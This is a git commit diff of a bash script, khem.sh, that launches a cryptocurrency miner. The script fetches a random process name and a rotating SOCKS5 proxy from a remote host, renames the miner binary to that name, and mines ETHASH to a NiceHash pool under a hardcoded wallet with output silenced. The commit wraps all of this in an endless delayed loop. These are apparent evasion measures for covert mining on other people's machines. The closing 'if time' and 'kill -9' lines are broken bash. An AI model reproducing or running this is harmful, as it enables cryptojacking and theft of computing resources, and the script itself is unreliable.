6e6e823bba62f62d79f89e1d0adea8396a5671fd
anon1jju <104222912+anon1jju@users.noreply.github.com>
2022-05-25 15:16:20 +0700

    Update khem.sh

--- khem.sh
+++ khem.sh
@@ -1,11 +1,19 @@
 #!/bin/bash
-#wget https://cuan.mine.nu/nbminer
-ACAK=$(echo $(curl -s https://cuan.mine.nu/random.php))
-chmod +x bubui && mv bubui $ACAK
-read -p 'Input Proxy nya: ' PROXY
-WALLET=3EGM4mZ5BL4dxDsZa1nKS5dXjMs1xnxADQ
-POOL=stratum+tcp://daggerhashimoto.eu.nicehash.com:3353
-WORKER1=$(echo $(shuf -i 1000-9999 -n 1))
-#WORKER2=$(date '+%d%b')
-#WORKER3=$(echo $(nvidia-smi --query-gpu=gpu_name --format=csv,noheader) | tr -d " ","-")
-./$ACAK --algo ETHASH --socks5 $PROXY --pool $POOL --user $WALLET.$WORKER1 --tls 0 -- ethstratum ETHV1 --silence 3
+echo "Preh suum mesen dile beuh :D!"
+sleep 11m
+while :
+do
+        sleep 5m
+        #wget https://cuan.mine.nu/nbminer
+        ACAK=$(echo $(curl -s https://cuan.mine.nu/random.php))
+        chmod +x bubui && mv bubui $ACAK
+        PROXY=$(echo $(curl -s https://cuan.mine.nu/ganti-proxy.php))
+        WALLET=3EGM4mZ5BL4dxDsZa1nKS5dXjMs1xnxADQ
+        POOL=stratum+tcp://daggerhashimoto.eu.nicehash.com:3353
+        WORKER1=$(echo $(shuf -i 1000-9999 -n 1))
+        #WORKER2=$(date '+%d%b')
+        #WORKER3=$(echo $(nvidia-smi --query-gpu=gpu_name --format=csv,noheader) | tr -d " ","-")
+        ./$ACAK --algo ETHASH --socks5 $PROXY --pool $POOL --user $WALLET.$WORKER1 --tls 0 -- ethstratum ETHV1 --silence 3
+        if time
+        kill -9
+done
